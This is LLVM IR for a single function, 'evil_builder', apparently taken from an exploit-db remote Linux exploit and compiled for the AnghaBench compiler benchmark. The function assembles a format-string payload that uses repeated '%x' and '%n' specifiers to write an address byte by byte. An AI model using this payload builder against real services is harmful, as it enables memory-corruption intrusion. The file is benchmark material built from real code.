; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1055.c_evil_builder.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1055.c_evil_builder.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [45 x i8] c"%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @evil_builder(i32 %0, i32 %1, i32 %2, i64 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i64 %3, i64* %8, align 8
  store i32 256, i32* %14, align 4
  %15 = load i8, i8* %10, align 1
  %16 = load i8, i8* %11, align 1
  %17 = load i8, i8* %12, align 1
  %18 = load i8, i8* %13, align 1
  %19 = load i32, i32* %5, align 4
  %20 = call i32 @doit(i8 zeroext %15, i8 zeroext %16, i8 zeroext %17, i8 zeroext %18, i32 %19)
  %21 = call i64 @malloc(i32 999)
  %22 = inttoptr i64 %21 to i8*
  store i8* %22, i8** %9, align 8
  %23 = load i8*, i8** %9, align 8
  %24 = call i32 @memset(i8* %23, i32 0, i32 999)
  %25 = load i64, i64* %8, align 8
  %26 = load i8, i8* %13, align 1
  %27 = zext i8 %26 to i64
  %28 = sub nsw i64 %27, %25
  %29 = trunc i64 %28 to i8
  store i8 %29, i8* %13, align 1
  %30 = load i64, i64* %8, align 8
  %31 = load i8, i8* %12, align 1
  %32 = zext i8 %31 to i64
  %33 = sub nsw i64 %32, %30
  %34 = trunc i64 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i64, i64* %8, align 8
  %36 = load i8, i8* %11, align 1
  %37 = zext i8 %36 to i64
  %38 = sub nsw i64 %37, %35
  %39 = trunc i64 %38 to i8
  store i8 %39, i8* %11, align 1
  %40 = load i64, i64* %8, align 8
  %41 = load i8, i8* %10, align 1
  %42 = zext i8 %41 to i64
  %43 = sub nsw i64 %42, %40
  %44 = trunc i64 %43 to i8
  store i8 %44, i8* %10, align 1
  %45 = load i8*, i8** %9, align 8
  %46 = load i8, i8* %13, align 1
  %47 = zext i8 %46 to i32
  %48 = sub nsw i32 %47, 16
  %49 = load i32, i32* %14, align 4
  %50 = add nsw i32 %48, %49
  %51 = load i32, i32* %7, align 4
  %52 = sub i32 %50, %51
  %53 = trunc i32 %52 to i8
  %54 = load i32, i32* %6, align 4
  %55 = load i8, i8* %12, align 1
  %56 = zext i8 %55 to i32
  %57 = load i8, i8* %13, align 1
  %58 = zext i8 %57 to i32
  %59 = sub nsw i32 %56, %58
  %60 = load i32, i32* %14, align 4
  %61 = add nsw i32 %59, %60
  %62 = trunc i32 %61 to i8
  %63 = load i32, i32* %6, align 4
  %64 = add i32 %63, 1
  %65 = load i8, i8* %11, align 1
  %66 = zext i8 %65 to i32
  %67 = load i8, i8* %12, align 1
  %68 = zext i8 %67 to i32
  %69 = sub nsw i32 %66, %68
  %70 = load i32, i32* %14, align 4
  %71 = add nsw i32 %69, %70
  %72 = trunc i32 %71 to i8
  %73 = load i32, i32* %6, align 4
  %74 = add i32 %73, 2
  %75 = load i8, i8* %10, align 1
  %76 = zext i8 %75 to i32
  %77 = load i8, i8* %11, align 1
  %78 = zext i8 %77 to i32
  %79 = sub nsw i32 %76, %78
  %80 = load i32, i32* %14, align 4
  %81 = add nsw i32 %79, %80
  %82 = trunc i32 %81 to i8
  %83 = load i32, i32* %6, align 4
  %84 = add i32 %83, 3
  %85 = call i32 @snprintf(i8* %45, i32 999, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i8 zeroext %53, i32 %54, i8 zeroext %62, i32 %64, i8 zeroext %72, i32 %74, i8 zeroext %82, i32 %84)
  %86 = load i8*, i8** %9, align 8
  ret i8* %86
}

declare dso_local i32 @doit(i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8 zeroext, i32, i8 zeroext, i32, i8 zeroext, i32, i8 zeroext, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
